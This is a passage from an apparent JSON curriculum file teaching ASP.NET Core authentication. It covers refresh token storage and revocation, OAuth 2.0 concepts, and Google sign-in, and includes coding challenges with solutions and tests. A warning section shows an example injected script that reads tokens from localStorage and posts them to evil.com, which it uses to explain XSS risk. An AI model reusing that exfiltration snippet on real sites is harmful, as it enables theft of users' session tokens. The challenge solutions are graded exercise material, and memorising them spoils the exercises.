_context.RefreshTokens\n        .Where(t => t.ExpiresAt < cutoff)\n        .ExecuteDeleteAsync();\n}\n```\n\nKeep revoked tokens for some time (30 days) for security auditing, then delete them. This provides an audit trail for investigating security incidents."
            },
            {
              "type": "WARNING",
              "title": "Refresh Token Storage",
              "content": "## Where to Store Refresh Tokens\n\nThe storage location for refresh tokens is critical for security. Different storage mechanisms have different vulnerability profiles.\n\n### Browser localStorage - NEVER Use for Sensitive Tokens\n\n**The Problem:** localStorage is accessible to any JavaScript on the page. One XSS vulnerability and an attacker can read ALL stored tokens.\n\n```javascript\n// Attacker's injected script\nfetch('https://evil.com/steal', {\n  method: 'POST',\n  body: JSON.stringify({\n    accessToken: localStorage.getItem('access_token'),\n    refreshToken: localStorage.getItem('refresh_token')  // STOLEN!\n  })\n});\n```\n\n**Why Developers Use It:** It is easy. Tokens persist across browser sessions. Works with any SPA framework.\n\n**Why It Is Dangerous:** XSS is the most common web vulnerability. Even if YOUR code is secure, third-party scripts (analytics, chat widgets, CDN-hosted libraries) can be compromised.\n\n### HttpOnly Cookies - Recommended for Web Applications\n\n**The Solution:** Store refresh tokens in HttpOnly cookies. JavaScript cannot access HttpOnly cookies.\n\n```csharp\nResponse.Cookies.Append(\"refreshToken\", refreshToken, new CookieOptions\n{\n    HttpOnly = true,        // JavaScript cannot access\n    Secure = true,          // HTTPS only\n    SameSite = SameSiteMode.Strict,  // CSRF protection\n    Expires = DateTimeOffset.UtcNow.AddDays(7),\n    Path = \"/api/token/refresh\"  // Only sent to refresh endpoint\n});\n```\n\n**Key Settings:**\n- `HttpOnly = true` - Cannot be read by JavaScript\n- `Secure = true` - Only transmitted over HTTPS\n- `SameSite = Strict` - Prevents CSRF attacks\n- `Path = \"/api/token/refresh\"` - Only sent when refreshing, not every request\n\n### CSRF Protection with HttpOnly Cookies\n\n**The New Concern:** While HttpOnly cookies prevent XSS token theft, they create a CSRF risk. The browser automatically sends cookies, so an attacker could trick your browser into making requests.\n\n**Mitigation:** Use `SameSite=Strict` (cookies only sent for same-origin requests) or implement CSRF tokens for the refresh endpoint.\n\n### Mobile App Storage\n\nFor mobile apps, use platform-specific secure storage:\n\n**iOS:**\n- Keychain Services (encrypted, hardware-backed on modern devices)\n- Never use UserDefaults\n\n**Android:**\n- EncryptedSharedPreferences (API 23+)\n- Android Keystore for key material\n- Never use regular SharedPreferences\n\n### Backend-for-Frontend (BFF) Pattern\n\nFor maximum security in SPAs, consider the BFF pattern:\n\n1. Your SPA never handles tokens directly\n2. A backend service (the BFF) holds the tokens\n3. SPA authenticates with the BFF using session cookies\n4. BFF adds JWT to upstream API calls\n\n```\nUser <-> SPA <--(session cookie)--> BFF <--(JWT)--> API\n```\n\n**Benefits:**\n- Tokens never reach the browser\n- Session cookies are HttpOnly\n- Full control over token lifecycle\n- Can implement server-side revocation easily\n\n**Drawbacks:**\n- Additional infrastructure\n- Latency for adding the extra hop\n- More complex deployment\n\n### Summary: Storage Recommendations\n\n| Application Type | Recommended Storage |\n|-----------------|--------------------|\n| Server-rendered web app | HttpOnly cookies |\n| SPA (less sensitive) | HttpOnly cookies via BFF or secure API |\n| SPA (high security) | BFF pattern |\n| iOS app | Keychain Services |\n| Android app | EncryptedSharedPreferences |\n| Desktop app | OS credential manager |\n\n**Never Use:**\n- localStorage or sessionStorage for tokens\n- Unencrypted files\n- URL parameters\n- Plain SharedPreferences (Android)\n- UserDefaults (iOS)"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-20-05-challenge-01",
              "title": "Implement Revoke Token Endpoint",
              "description": "Create an endpoint to revoke refresh tokens, allowing users to terminate sessions.",
              "instructions": "Implement a token revocation endpoint for ShopFlow!\n\n1. Create a RevokeTokenCommand that takes:\n   - Token (string) - the refresh token to revoke\n   - Reason (string, optional) - why the token is being revoked\n\n2. Create a RevokeTokenHandler that:\n   - Finds the token by its hash in the database\n   - Validates the token belongs to the current user\n   - Revokes the entire token family (for security)\n   - Returns success/failure result\n\n3. Create the API endpoint:\n   - Route: POST /api/auth/revoke\n   - Require authentication\n   - Accept the token in the request body\n   - Return 200 OK on success, 400 if token not found\n\n4. Security considerations:\n   - Users can only revoke their own tokens\n   - Revoking a token revokes the entire family\n   - Log the revocation for security auditing",
              "starterCode": "using MediatR;\nusing Microsoft.EntityFrameworkCore;\nusing System.Security.Claims;\nusing System.Security.Cryptography;\n\n// Assume these exist\npublic class RefreshToken\n{\n    public int Id { get; set; }\n    public string TokenHash { get; set; } = string.Empty;\n    public string UserId { get; set; } = string.Empty;\n    public string FamilyId { get; set; } = string.Empty;\n    public DateTime? RevokedAt { get; set; }\n    public string? RevokedReason { get; set; }\n    public bool IsRevoked => RevokedAt is not null;\n}\n\npublic class ShopFlowDbContext : DbContext\n{\n    public DbSet<RefreshToken> RefreshTokens => Set<RefreshToken>();\n}\n\n// TODO: Create RevokeTokenCommand\n// - Token (string)\n// - Reason (string?)\n// - CurrentUserId (string) - the user making the request\n\n// TODO: Create RevokeTokenResult\n// - Succeeded (bool)\n// - Message (string)\n\n// TODO: Create RevokeTokenHandler that:\n// 1. Hashes the provided token\n// 2. Finds the token in database\n// 3. Validates it belongs to CurrentUserId\n// 4. Revokes all tokens with the same FamilyId\n// 5. Returns appropriate result\n\n// Helper method for hashing\npublic static string HashToken(string token)\n{\n    using var sha256 = SHA256.Create();\n    var bytes = System.Text.Encoding.UTF8.GetBytes(token);\n    var hash = sha256.ComputeHash(bytes);\n    return Convert.ToBase64String(hash);\n}\n\n// API Endpoint\nvar builder = WebApplication.CreateBuilder(args);\nbuilder.Services.AddDbContext<ShopFlowDbContext>(o => o.UseInMemoryDatabase(\"Test\"));\nbuilder.Services.AddMediatR(cfg => cfg.RegisterServicesFromAssembly(typeof(Program).Assembly));\n\nvar app = builder.Build();\n\n// TODO: Map POST /api/auth/revoke endpoint\n// - Require authorization\n// - Get current user ID from claims\n// - Send RevokeTokenCommand\n// - Return appropriate response\n\napp.Run();",
              "solution": "using MediatR;\nusing Microsoft.EntityFrameworkCore;\nusing System.Security.Claims;\nusing System.Security.Cryptography;\n\npublic class RefreshToken\n{\n    public int Id { get; set; }\n    public string TokenHash { get; set; } = string.Empty;\n    public string UserId { get; set; } = string.Empty;\n    public string FamilyId { get; set; } = string.Empty;\n    public DateTime? RevokedAt { get; set; }\n    public string? RevokedReason { get; set; }\n    public bool IsRevoked => RevokedAt is not null;\n}\n\npublic class ShopFlowDbContext : DbContext\n{\n    public ShopFlowDbContext(DbContextOptions<ShopFlowDbContext> options) : base(options) { }\n    public DbSet<RefreshToken> RefreshTokens => Set<RefreshToken>();\n}\n\npublic record RevokeTokenCommand(\n    string Token,\n    string? Reason,\n    string CurrentUserId\n) : IRequest<RevokeTokenResult>;\n\npublic record RevokeTokenResult(\n    bool Succeeded,\n    string Message\n);\n\npublic class RevokeTokenHandler : IRequestHandler<RevokeTokenCommand, RevokeTokenResult>\n{\n    private readonly ShopFlowDbContext _context;\n    private readonly ILogger<RevokeTokenHandler> _logger;\n    \n    public RevokeTokenHandler(ShopFlowDbContext context, ILogger<RevokeTokenHandler> logger)\n    {\n        _context = context;\n        _logger = logger;\n    }\n    \n    public async Task<RevokeTokenResult> Handle(\n        RevokeTokenCommand request,\n        CancellationToken cancellationToken)\n    {\n        var tokenHash = HashToken(request.Token);\n        \n        var token = await _context.RefreshTokens\n            .FirstOrDefaultAsync(t => t.TokenHash == tokenHash, cancellationToken);\n        \n        if (token is null)\n        {\n            return new RevokeTokenResult(false, \"Token not found\");\n        }\n        \n        // Security: Users can only revoke their own tokens\n        if (token.UserId != request.CurrentUserId)\n        {\n            _logger.LogWarning(\n                \"User {UserId} attempted to revoke token belonging to {TokenOwner}\",\n                request.CurrentUserId,\n                token.UserId);\n            \n            return new RevokeTokenResult(false, \"Token not found\");\n        }\n        \n        if (token.IsRevoked)\n        {\n            return new RevokeTokenResult(true, \"Token was already revoked\");\n        }\n        \n        // Revoke entire token family for security\n        var familyTokens = await _context.RefreshTokens\n            .Where(t => t.FamilyId == token.FamilyId && t.RevokedAt == null)\n            .ToListAsync(cancellationToken);\n        \n        var reason = request.Reason ?? \"User requested revocation\";\n        \n        foreach (var familyToken in familyTokens)\n        {\n            familyToken.RevokedAt = DateTime.UtcNow;\n            familyToken.RevokedReason = reason;\n        }\n        \n        await _context.SaveChangesAsync(cancellationToken);\n        \n        _logger.LogInformation(\n            \"Revoked {Count} tokens in family {FamilyId} for user {UserId}: {Reason}\",\n            familyTokens.Count,\n            token.FamilyId,\n            request.CurrentUserId,\n            reason);\n        \n        return new RevokeTokenResult(true, $\"Revoked {familyTokens.Count} tokens\");\n    }\n    \n    private static string HashToken(string token)\n    {\n        using var sha256 = SHA256.Create();\n        var bytes = System.Text.Encoding.UTF8.GetBytes(token);\n        var hash = sha256.ComputeHash(bytes);\n        return Convert.ToBase64String(hash);\n    }\n}\n\nvar builder = WebApplication.CreateBuilder(args);\nbuilder.Services.AddDbContext<ShopFlowDbContext>(o => o.UseInMemoryDatabase(\"Test\"));\nbuilder.Services.AddMediatR(cfg => cfg.RegisterServicesFromAssembly(typeof(Program).Assembly));\n\nvar app = builder.Build();\n\napp.MapPost(\"/api/auth/revoke\", async (\n    RevokeTokenRequest request,\n    HttpContext httpContext,\n    ISender sender) =>\n{\n    var userId = httpContext.User.FindFirstValue(ClaimTypes.NameIdentifier);\n    \n    if (string.IsNullOrEmpty(userId))\n    {\n        return Results.Unauthorized();\n    }\n    \n    var command = new RevokeTokenCommand(\n        Token: request.Token,\n        Reason: request.Reason,\n        CurrentUserId: userId\n    );\n    \n    var result = await sender.Send(command);\n    \n    if (!result.Succeeded)\n    {\n        return Results.BadRequest(new { result.Message });\n    }\n    \n    return Results.Ok(new { result.Message });\n})\n.RequireAuthorization()\n.WithName(\"RevokeToken\")\n.WithTags(\"Authentication\");\n\napp.Run();\n\npublic record RevokeTokenRequest(string Token, string? Reason = null);",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Should revoke all tokens in the family",
                  "expectedOutput": "FamilyId",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Should verify token belongs to current user",
                  "expectedOutput": "CurrentUserId",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Should hash the token before lookup",
                  "expectedOutput": "HashToken",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Should require authorization",
                  "expectedOutput": "RequireAuthorization",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Create a RevokeTokenCommand record with Token, Reason, and CurrentUserId properties."
                },
                {
                  "level": 2,
                  "text": "Hash the provided token using SHA256 before looking it up in the database."
                },
                {
                  "level": 3,
                  "text": "Always check that token.UserId matches the CurrentUserId before revoking - users can only revoke their own tokens."
                },
                {
                  "level": 4,
                  "text": "Use Where(t => t.FamilyId == token.FamilyId) to find all tokens in the family for revocation."
                },
                {
                  "level": 5,
                  "text": "Get the current user ID from HttpContext.User.FindFirstValue(ClaimTypes.NameIdentifier) in the endpoint."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Only revoking the single token, not the entire family",
                  "consequence": "Other tokens in the rotation chain remain valid. An attacker who stole an older token could still use it.",
                  "correction": "Always revoke the entire token family when any token is revoked. This ensures complete session termination."
                },
                {
                  "mistake": "Not verifying token ownership",
                  "consequence": "Malicious users could revoke other users' tokens, causing denial of service.",
                  "correction": "Always check that the token's UserId matches the current user making the request."
                },
                {
                  "mistake": "Storing or looking up plaintext tokens",
                  "consequence": "If the database is compromised, all refresh tokens are exposed in plaintext.",
                  "correction": "Always hash tokens before storage and lookup. Use SHA256 or stronger hashing."
                },
                {
                  "mistake": "Returning different errors for 'not found' vs 'not your token'",
                  "consequence": "Attackers can probe which tokens exist in the system.",
                  "correction": "Return the same 'Token not found' message for both cases to prevent information disclosure."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        }
      ]
    },
    {
      "id": "module-21",
      "title": "External Authentication Providers",
      "description": "Integrate OAuth 2.0 and OpenID Connect with Google, Microsoft, and GitHub. Enable social login for your ShopFlow application.",
      "difficulty": "intermediate",
      "estimatedHours": 3,
      "lessons": [
        {
          "id": "lesson-21-01",
          "title": "OAuth 2.0 and OpenID Connect (Sign In With...)",
          "moduleId": "module-21",
          "order": 1,
          "estimatedMinutes": 30,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding OAuth",
              "content": "Imagine you arrive at a luxury hotel and want to use the valet parking service. You hand the valet attendant a special key - not your full key ring with your house keys, car alarm fob, and gym locker key - just the valet key. This limited key can start the car and open the doors, but it cannot open the trunk where your valuables are stored, and it cannot access the glove compartment. You are delegating LIMITED access to your car without giving full control.\n\nOAuth works exactly the same way. When you click 'Sign in with Google', you are not giving the application your Google password. Instead, you are telling Google: 'Give this application a valet key - let them know who I am and maybe access my basic profile, but do not let them read my private emails or delete my files.'\n\nThe beauty of this system is trust delegation. You trust Google to verify your identity (they already know you from your Gmail login). The application trusts Google's verification (Google is a well-known identity provider). And you maintain control over what information and actions you are delegating - these are called SCOPES. Just like a valet key limits what the attendant can do with your car, OAuth scopes limit what the application can access.\n\nIf you later decide you no longer trust the application, you can revoke access from your Google account settings - like taking back the valet key. The application loses access immediately without you needing to change any passwords."
            },
            {
              "type": "EXAMPLE",
              "title": "Adding Google Authentication",
              "content": "This example shows how to configure Google authentication in your ASP.NET Core application. You will need to create credentials in the Google Cloud Console first.",
              "code": "// ===== PROGRAM.CS - GOOGLE AUTHENTICATION SETUP =====\n\nusing Microsoft.AspNetCore.Authentication.Cookies;\nusing Microsoft.AspNetCore.Authentication.Google;\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// Step 1: Configure Authentication with Google\nbuilder.Services.AddAuthentication(options =>\n{\n    // Use cookies as the default scheme for web apps\n    options.DefaultScheme = CookieAuthenticationDefaults.AuthenticationScheme;\n    // Use Google when authentication is challenged\n    options.DefaultChallengeScheme = GoogleDefaults.AuthenticationScheme;\n})\n.AddCookie(options =>\n{\n    options.LoginPath = \"/login\";\n    options.LogoutPath = \"/logout\";\n    options.Cookie.HttpOnly = true;\n    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;\n    options.ExpireTimeSpan = TimeSpan.FromDays(7);\n})\n.AddGoogle(GoogleDefaults.AuthenticationScheme, options =>\n{\n    // Load credentials from configuration (never hardcode!)\n    options.ClientId = builder.Configuration[\"Authentication:Google:ClientId\"]!;\n    options.ClientSecret = builder.Configuration[\"Authentication:Google:ClientSecret\"]!;\n    \n    // Request additional scopes beyond basic profile\n    options.Scope.Add(\"email\");\n    options.Scope.Add(\"profile\");\n    \n    // Map claims from Google to your application\n    options.ClaimActions.MapJsonKey(\"picture\", \"picture\");\n    options.ClaimActions.MapJsonKey(\"locale\", \"locale\");\n    \n    // Save tokens if you need to call Google APIs later\n    options.SaveTokens = true;\n    \n    // Handle events during authentication\n    options.Events.OnCreatingTicket = async context =>\n    {\n        // Access user info from Google\n        var email = context.Principal?.FindFirst(c => c.Type == System.Security.Claims.ClaimTypes.Email)?.Value;\n        var name = context.Principal?.FindFirst(c => c.Type == System.Security.Claims.ClaimTypes.Name)?.Value;\n        \n        // Log the successful authentication\n        var logger = context.HttpContext.RequestServices.GetRequiredService<ILogger<Program>>();\n        logger.LogInformation(\"User {Email} ({Name}) authenticated via Google\", email, name);\n        \n        // You could also:\n        // - Create/update user in your database\n        // - Add custom claims based on your business logic\n        // - Check if user is allowed to access your app\n        \n        await Task.CompletedTask;\n    };\n});\n\nbuilder.Services.AddAuthorization();\n\nvar app = builder.Build();\n\napp.UseAuthentication();\napp.UseAuthorization();\n\n// Login endpoint - redirects to Google\napp.MapGet(\"/login\", () => Results.Challenge(\n    new AuthenticationProperties { RedirectUri = \"/\" },\n    new[] { GoogleDefaults.AuthenticationScheme }\n));\n\n// Logout endpoint\napp.MapGet(\"/logout\", async (HttpContext ctx) =>\n{\n    await ctx.SignOutAsync(CookieAuthenticationDefaults.AuthenticationScheme);\n    return Results.Redirect(\"/\");\n});\n\n// Protected endpoint showing user info\napp.MapGet(\"/profile\", (HttpContext ctx) =>\n{\n    var user = ctx.User;\n    return Results.Ok(new\n    {\n        Name = user.FindFirst(System.Security.Claims.ClaimTypes.Name)?.Value,\n        Email = user.FindFirst(System.Security.Claims.ClaimTypes.Email)?.Value,\n        Picture = user.FindFirst(\"picture\")?.Value,\n        IsAuthenticated = user.Identity?.IsAuthenticated ?? false\n    });\n}).RequireAuthorization();\n\napp.MapGet(\"/\", (HttpContext ctx) =>\n{\n    if (ctx.User.Identity?.IsAuthenticated == true)\n    {\n        return Results.Ok($\"Welcome, {ctx.User.Identity.Name}! Visit /profile for more info.\");\n    }\n    return Results.Ok(\"Welcome! Visit /login to sign in with Google.\");\n});\n\napp.Run();\n\n// ===== APPSETTINGS.JSON =====\n// {\n//   \"Authentication\": {\n//     \"Google\": {\n//       \"ClientId\": \"your-client-id.apps.googleusercontent.com\",\n//       \"ClientSecret\": \"your-client-secret\"\n//     }\n//   }\n// }\n//\n// For production, use User Secrets or Azure Key Vault:\n// dotnet user-secrets set \"Authentication:Google:ClientId\" \"your-client-id\"\n// dotnet user-secrets set \"Authentication:Google:ClientSecret\" \"your-client-secret\"",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "OAuth 2.0 Flow Explained",
              "content": "## The Authorization Code Flow\n\nOAuth 2.0 defines several flows for different scenarios. For web applications, the Authorization Code flow is the most secure and commonly used. Let's walk through exactly what happens when a user clicks 'Sign in with Google':\n\n**Step 1: Authorization Request**\nYour application redirects the user to Google's authorization endpoint. The redirect URL includes your client ID, the scopes you are requesting (email, profile), a redirect URI where Google should send the user back, and a random state value to prevent CSRF attacks.\n\n**Step 2: User Authentication**\nThe user sees Google's login page (if not already logged in) and then a consent screen showing what your application is requesting access to. The user can approve or deny the request. This happens entirely on Google's domain - your application never sees the user's Google password.\n\n**Step 3: Authorization Code**\nIf the user approves, Google redirects back to your application's callback URL with an authorization code. This code is short-lived (typically 10 minutes) and can only be used once. The state parameter is also returned so you can verify it matches what you sent.\n\n**Step 4: Token Exchange**\nYour server sends the authorization code to Google's token endpoint, along with your client secret. This happens server-to-server, so the client secret is never exposed to the browser. Google validates the code and returns an access token (and optionally a refresh token and ID token).\n\n**Step 5: Access Protected Resources**\nYour application uses the access token to call Google's APIs on behalf of the user. The access token proves the user authorized this access. Access tokens are typically short-lived (1 hour) for security.\n\n## Access Tokens vs ID Tokens\n\n**Access Tokens** are credentials used to access protected resources (APIs). They are like permission slips that say 'the bearer of this token is allowed to access these specific resources.' Access tokens are opaque to your application - you don't need to understand their contents, just pass them to APIs.\n\n**ID Tokens** are part of OpenID Connect (built on OAuth 2.0). They are JWTs containing verified claims about the user's identity: who they are, when they authenticated, and how. ID tokens are meant to be read by your application to establish the user's session.\n\n## Scopes Control Access\n\nScopes define what your application can access. Common scopes include:\n- `openid` - Required for OpenID Connect, returns ID token\n- `profile` - User's name, picture, locale\n- `email` - User's email address\n- `offline_access` - Request refresh token for long-term access\n\nAlways request the minimum scopes needed. Users are more likely to trust applications that request less access."
            },
            {
              "type": "ARCHITECTURE",
              "title": "Designing Multi-Provider Authentication",
              "content": "## Provider Abstraction Pattern\n\nWhen supporting multiple authentication providers (Google, Microsoft, GitHub), you need a clean abstraction that handles their differences while presenting a unified interface to your application. The key insight is that external providers give you external identities, but your application needs internal user records.\n\n**The External Login Table Pattern:**\n```\nUsers                    ExternalLogins\n------                   --------------\nId (internal)            UserId (FK to Users)\nEmail                    Provider (Google, Microsoft, GitHub)\nDisplayName              ProviderKey (external user ID)\nCreatedAt                CreatedAt\n```\n\nOne user can have multiple external logins linked. This allows users to sign in with any of their linked providers. A user who originally signed up with Google can later link their Microsoft account.\n\n## User Linking Strategy\n\nWhen a user authenticates via an external provider, you face a critical decision: is this a new user or an existing one?\n\n**Email-Based Linking (Simple but Risky):**\nIf an external identity's email matches an existing user, automatically link them. This is convenient but dangerous - if the external provider doesn't verify emails, an attacker could claim any email address.\n\n**Explicit Linking (Secure):**\nNever automatically link based on email. Instead, require users to explicitly link accounts while logged in. User signs in with Google, then while authenticated, clicks 'Link Microsoft account' and goes through Microsoft's OAuth flow. Both identities are now linked to the same user record.\n\n**Recommended Hybrid:**\nOnly auto-link if the external provider guarantees verified emails (Google, Microsoft with verified domains). Even then, consider requiring confirmation: 'We found an existing account with this email. Please verify by...'.\n\n## Handling Provider Failures Gracefully\n\nExternal providers can fail, go down for maintenance, or revoke your application's access. Your application must handle these scenarios gracefully:\n\n**Temporary Failures:**\n- Provider timeout during authentication: Show friendly error, offer retry\n- Token refresh failure: Prompt user to re-authenticate\n- Network issues: Implement retry with exponential backoff\n\n**Permanent Failures:**\n- Provider revokes your app's credentials: Have admin notification system\n- User revokes access on provider's site: Handle gracefully on next login\n- Provider discontinues OAuth support: Support multiple providers so users have alternatives\n\n**Fallback Strategy:**\nConsider offering password-based authentication as a fallback. Users who signed up with Google can 'Add password' to their account. If Google is down, they can still access their account.\n\n## Security Considerations\n\n**State Parameter:** Always use a cryptographically random state parameter to prevent CSRF attacks. Validate it matches when the user returns from the provider.\n\n**PKCE for Public Clients:** If building a mobile app or SPA, use PKCE (Proof Key for Code Exchange) to protect the authorization code.\n\n**Token Storage:** Store refresh tokens encrypted in your database. Never expose access tokens to client-side JavaScript if avoidable.\n\n**Provider Verification:** Verify that ID tokens are actually signed by the provider. Use provider's JWKS (JSON Web Key Set) endpoint to validate signatures.\n\n**Claim Validation:** Don't trust all claims blindly. Validate issuer, audience, expiration, and that the token was intended for your application."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-21-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Configure Google OAuth authentication for a web application.",
              "instructions": "Set up Google authentication for the ShopFlow application!\n\n1. Configure authentication with:\n   - Default scheme: Cookies\n   - Challenge scheme: Google\n\n2. Add Cookie authentication with:\n   - LoginPath: /login\n   - HttpOnly cookies\n   - 7-day expiration\n\n3. Add Google authentication with:\n   - ClientId and ClientSecret from configuration\n   - Add 'email' and 'profile' scopes\n   - SaveTokens = true\n\n4. Create endpoints:\n   - GET /login - Challenge with Google\n   - GET /profile - Return user's name and email (protected)\n\n5. Add proper middleware order!",
              "starterCode": "using Microsoft.AspNetCore.Authentication.Cookies;\nusing Microsoft.AspNetCore.Authentication.Google;\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// TODO: Configure Authentication\n// - DefaultScheme = Cookies\n// - DefaultChallengeScheme = Google\n\n// TODO: Add Cookie authentication\n// - LoginPath = \"/login\"\n// - Cookie.HttpOnly = true\n// - ExpireTimeSpan = 7 days\n\n// TODO: Add Google authentication\n// - ClientId from Configuration[\"Auth:Google:ClientId\"]\n// - ClientSecret from Configuration[\"Auth:Google:ClientSecret\"]\n// - Add scopes: email, profile\n// - SaveTokens = true\n\nvar app = builder.Build();\n\n// TODO: Add middleware\n\n// TODO: GET /login - Challenge with Google, redirect to /profile\n\n// TODO: GET /profile (protected) - Return user's Name and Email claims\n\napp.Run();",
              "solution": "using Microsoft.AspNetCore.Authentication.Cookies;\nusing Microsoft.AspNetCore.Authentication.Google;\n\nvar builder = WebApplication.CreateBuilder(args);\n\nbuilder.Services.AddAuthentication(options =>\n{\n    options.DefaultScheme = CookieAuthenticationDefaults.AuthenticationScheme;\n    options.DefaultChallengeScheme = GoogleDefaults.AuthenticationScheme;\n})\n.AddCookie(options =>\n{\n    options.LoginPath = \"/login\";\n    options.Cookie.HttpOnly = true;\n    options.ExpireTimeSpan = TimeSpan.FromDays(7);\n})\n.AddGoogle(options =>\n{\n    options.ClientId = builder.Configuration[\"Auth:Google:ClientId\"]!;\n    options.ClientSecret = builder.Configuration[\"Auth:Google:ClientSecret\"]!;\n    options.Scope.Add(\"email\");\n    options.Scope.Add(\"profile\");\n    options.SaveTokens = true;\n});\n\nbuilder.Services.AddAuthorization();\n\nvar app = builder.Build();\n\napp.UseAuthentication();\napp.UseAuthorization();\n\napp.MapGet(\"/login\", () => Results.Challenge(\n    new AuthenticationProperties { RedirectUri = \"/profile\" },\n    new[] { GoogleDefaults.AuthenticationScheme }\n));\n\napp.MapGet(\"/profile\", (HttpContext ctx) => Results.Ok(new\n{\n    Name = ctx.User.FindFirst(System.Security.Claims.ClaimTypes.Name)?.Value,\n    Email = ctx.User.FindFirst(System.Security.Claims.ClaimTypes.Email)?.Value\n})).RequireAuthorization();\n\napp.Run();",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Should configure Google authentication",
                  "expectedOutput": "AddGoogle",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Should add email scope",
                  "expectedOutput": "email",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Should use cookie authentication",
                  "expectedOutput": "AddCookie",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Should save tokens",
                  "expectedOutput": "SaveTokens",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Start with builder.Services.AddAuthentication() and set both DefaultScheme and DefaultChallengeScheme."
                },
                {
                  "level": 2,
                  "text": "Chain .AddCookie() and .AddGoogle() to the AddAuthentication call."
                },
                {
                  "level": 3,
                  "text": "For Google, use options.Scope.Add() to request additional scopes."
                },
                {
                  "level": 4,
                  "text": "The /login endpoint should return Results.Challenge() with GoogleDefaults.AuthenticationScheme."
                },
                {
                  "level": 5,
                  "text": "Access claims using ctx.User.FindFirst(ClaimTypes.Name)?.Value for the profile endpoint."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Hardcoding ClientId and ClientSecret",
                  "consequence": "Secrets get committed to source control and exposed publicly.",
                  "correction": "Always load secrets from configuration, user secrets, or a vault service."
                },
                {
                  "mistake": "Forgetting to add the email scope",
                  "consequence": "The email claim will be null because you didn't request permission to access it.",
                  "correction": "Add options.Scope.Add(\"email\") to request the email scope from Google."
                },
                {
                  "mistake": "Not setting SaveTokens = true when needed",
                  "consequence": "You cannot call Google APIs on behalf of the user because you don't have their access token.",
                  "correction": "Set SaveTokens = true if you plan to call provider APIs after authentication."
                },
                {
                  "mistake": "Using wrong claim types",
                  "consequence": "Claims return null because you're looking for the wrong claim type string.",
                  "correction": "Use ClaimTypes.Name, ClaimTypes.Email, or check the actual claim types in the user's claims collection."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-21-02",
          "title": "Sign In with Google",
          "moduleId": "module-21",
          "order": 2,
          "estimatedMinutes": 35,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "OAuth as a Valet Key",
              "content": "Picture yourself arriving at an upscale restaurant with your expensive car. Instead of parking it yourself in a distant lot, you hand the valet attendant a special key. But here is the crucial detail: this is not your regular key ring with your house keys, office access cards, and gym locker key. This is a VALET KEY - specifically designed to start the engine and open the doors, but it CANNOT open the trunk where your laptop and valuables are stored, and it CANNOT access the glove compartment containing your registration and insurance documents.\n\nThis is exactly how OAuth 2.0 works when you click 'Sign in with Google'. You are not giving the ShopFlow application your Google password - that would be like handing over your entire key ring, including your house keys, to a stranger. Instead, you are telling Google: 'Give ShopFlow a valet key. Let them verify who I am and see my basic profile information, but absolutely do not let them read my private emails, access my Google Drive documents, or delete my YouTube watch history.'\n\nThe permissions you grant are called SCOPES - just like how a valet key has physical limitations built into its design, OAuth scopes define exactly what the application can and cannot access. When ShopFlow requests the 'email' and 'profile' scopes, it is asking for a very limited valet key that only reveals your name, email address, and profile picture.\n\nThe beauty of this system is that you maintain complete control. Just as you can ask the restaurant to return your valet key at any time, you can visit your Google Account settings and revoke ShopFlow's access instantly. The application immediately loses its ability to verify your identity - no password changes required, no worry about whether they saved your credentials. The valet key simply stops working.\n\nThis delegation of LIMITED access without sharing secrets is the fundamental principle that makes OAuth secure and widely trusted across the internet."
            },
            {
              "type": "EXAMPLE",
              "title": "Setting Up Google Authentication",
              "content": "Before writing any code, you need to configure your application in the Google Cloud Console. This creates the OAuth credentials that identify your application to Google.",
              "code": "// ===== STEP 1: GOOGLE CLOUD CONSOLE SETUP =====\n// 1. Go to https://console.cloud.google.com/\n// 2. Create a new project or select existing one\n// 3. Navigate to APIs & Services > Credentials\n// 4. Click 'Create Credentials' > 'OAuth client ID'\n// 5. Configure OAuth consent screen first (if prompted):\n//    - Choose 'External' user type for public apps\n//    - Add app name, user support email, developer contact\n//    - Add scopes: .../auth/userinfo.email, .../auth/userinfo.profile, openid\n// 6. Create OAuth client ID:\n//    - Application type: 'Web application'\n//    - Name: 'ShopFlow Web'\n//    - Authorized redirect URIs: \n//      - Development: https://localhost:5001/signin-google\n//      - Production: https://shopflow.example.com/signin-google\n// 7. Copy the Client ID and Client Secret\n\n// ===== STEP 2: INSTALL NUGET PACKAGES =====\n// dotnet add package Microsoft.AspNetCore.Authentication.Google\n\n// ===== STEP 3: CONFIGURE USER SECRETS (Development) =====\n// dotnet user-secrets init\n// dotnet user-secrets set \"Authentication:Google:ClientId\" \"your-client-id.apps.googleusercontent.com\"\n// dotnet user-secrets set \"Authentication:Google:ClientSecret\" \"your-client-secret\"\n\n// ===== STEP 4: PROGRAM.CS CONFIGURATION =====\nusing Microsoft.AspNetCore.Authentication;\nusing Microsoft.AspNetCore.Authentication.Cookies;\nusing Microsoft.AspNetCore.Authentication.Google;\nusing System.Security.Claims;\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// Configure authentication with multiple schemes\nbuilder.Services.AddAuthentication(options =>\n{\n    // Cookies store the authenticated session\n    options.DefaultScheme = CookieAuthenticationDefaults.AuthenticationScheme;\n    // Google handles the actual authentication\n    options.DefaultChallengeScheme 